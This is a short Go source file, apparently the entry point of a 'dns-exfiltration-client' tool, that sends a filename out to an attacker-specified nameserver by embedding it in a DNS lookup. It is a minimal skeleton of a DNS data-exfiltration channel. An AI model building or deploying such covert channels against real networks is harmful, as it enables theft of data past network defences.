package main

import (
	"context"
	"dns-exfiltration-client/parser"
	"log"
	"net"
)

const (
	// To simplify implementations, the total length of a domain name (i.e.,
	// label octets and label length octets) is restricted to 255 octets or
	// less.
	// - https://www.rfc-editor.org/rfc/rfc1035#section-3.1
	MAX_DOMAIN_NAME_LENGTH = 255
)

func main() {
	args := parser.ParseArgs()

	_, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", args.Filename+"."+args.NameServer)
	if err != nil {
		log.Fatalln(err)
	}
}
